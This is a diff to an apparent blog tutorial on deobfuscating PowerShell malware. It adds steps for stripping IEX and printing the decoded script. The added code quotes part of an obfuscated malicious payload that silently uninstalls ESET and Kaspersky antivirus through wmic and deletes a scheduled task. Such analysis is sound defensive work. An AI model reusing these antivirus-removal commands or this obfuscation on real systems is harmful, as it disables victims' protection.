@@ -1,5 +1,5 @@
 ---
-title: "An easy way to deobfuscated obfuscated PowerShell"
+title: "An easy way to deobfuscate obfuscated PowerShell"
 date: "2021-06-02"
 layout: single
 tags:
@@ -110,3 +110,34 @@ Then run the above line `(( Get-vARIabLE  lw7ef  ).valUe[-1..-( ( Get-vARIabLE  
 
 ![8](gambar disini)
 
+![9](gambar disini)
+
+On the left side. Our code become more readable than before (right side). All we need to continue deobfuscate the code again.
+
+Identify and remove `IEX`
+
+![10](gambar disini)
+
+Append our variable at in front of the code.
+```
+$decoded =  (' . ( 9N0PShOME[21]+9N0PsHOmE[30]+qfhXqfh) ((qfhcmd /c staqfh+qfhrt /b wmic.exe product where pgOname like fEH%Eset%fEHpgO call uninstall /noinqfh+qfhteractive
+'+'
+cmd /c start /b wmic.exe product '+'where pgOname like fEH%%Kasperskyqfh+qfh%%fEHpgO call uninstall /qfh+qfhnointeractivqfh+qfhe
+
+<--- snippet --->
+
+schqfh+qfhtasks /delete /tn Rtsa /Fqfh).RePlacE(([Char]75+[Char]118+[Char]49),qfh9N0qfh).RePlacE(([Char]102+[Char]'+'69+[Char]72),[STrINg][Char]'+'39).RePlacE(qfhf'+'G9qfh,[STrINg][Char'+']124).RePlacE(('+'[Char]120+[Char]74+'+'[Char]121),qfhh83qfh).RePlacE(([Char]90+[Char]111+[Char]87),[STrINg][Char]96).RePlacE(([Char]112+[Char]103+[Char]79),[STrINg][Char'+']34)'+' ) 
+').rePlacE(([cHAr]113+[cHAr]102+[cHAr]104),[StriNG][cHAr]39).rePlacE('9N0','$').rePlacE(([cHAr]104+[cHAr]56+[cHAr]51),[StriNG][cHAr]92)
+```
+
+Copy the whole code and execute in PowerShell ISE. Print value of variable decoded into another text file.
+
+![11](gambar disini)
+
+![12](gambar disini)
+
+Based on the result, still we can see that the code not full deobfuscated. Repeat the steps until we get the clean version of the code.
+
+Below is the final deobfuscation of the code, and the script now become clean and readable.
+
+![13](gambar disini)
